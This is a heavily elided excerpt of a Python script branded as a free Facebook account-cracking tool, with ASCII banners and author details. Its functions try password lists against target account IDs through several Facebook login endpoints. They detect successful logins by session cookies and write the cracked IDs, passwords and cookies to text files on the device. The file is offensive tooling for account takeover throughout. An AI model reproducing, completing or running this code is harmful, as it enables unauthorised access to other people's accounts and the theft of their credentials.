...
echo "  ____  ____  _____ _  __    _    ____  ____  _   _    _    ";
echo " |  _ \|  _ \| ____| |/ /   / \  |  _ \/ ___|| | | |  / \   ";
echo " | |_) | |_) |  _| | ' /   / _ \ | |_) \___ \| |_| | / _ \  ";
echo " |  __/|  _ <| |___| . \  / ___ \|  _ < ___) |  _  |/ ___ \ ";
echo " |_|   |_| \_\_____|_|\_\/_/   \_\_| \_\____/|_| |_/_/   \_\";
echo "                                                            ";
    ...
    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   : CHUTTA● AHMED             │
    │ [✓] GITHUB   : Hacker0CHUTTA●                │
    │ [✓] WHATSAPP : +88017*******2         │
    │ [✓] VERSION  :\033[1;32m 5.0                    │
    │ [✓] STUTAS      : FREE \033[1;37m            │
    └───────────────────────────────────────┘""")                                           
...
logo=(f"""UPDATE DONE\x1b[1;97m
   _______ ____  _________________     __ _______  _______
 / ___/ // / / / /_  __/_  __/ _ |   / //_/  _/ |/ / ___/
/ /__/ _  / /_/ / / /   / / / __ |  / ,< _/ //    / (_ / 
\___/_//_/\____/ /_/   /_/ /_/ |_| /_/|_/___/_/|_/\___/  
""")
...
def Spy():
	...
	if me in ["1", "01","11","A","a"]:
		...
		try:
			...
			exit()
		print(f' [1] Method 1 ✓ (m.facebook)\n [2] Method 2 ✓ (b-graph)\n [3] Method 3 ✓ (mbasic.facebook)\n [4] Method 4 ✓ (b-graph 2)\n [5] Method 5 ✗ (free. facebook)\n [6] Method 6 ✓ (p.facebook) \n [7] Method 7 ✗ (mobile.facebook) \n')
		mthd=input(f' Choose: ')
		plist=[]
		try:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [ FB ● ] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                open(f'/sdcard/PRE-OK.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
...
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [CHUTTA●] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [ CHUTTA●OK ] %s | %s'%(ids,pas))
                                open(f'/sdcard/CHUTTA●OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [CHUTTA●OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/CHUTTA●OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [ CHUTTA●CP ] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/FB.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def gml():
                ...
                clear()
                pcp.append(f'y')
                print('\033[1;32m Name  example:  CHUTTA●, Siam, etc')
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[ CHUTTA●-OK ] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[ CHUTTA●-CP ] '+idf+' | '+ps+'\033[0;97m')
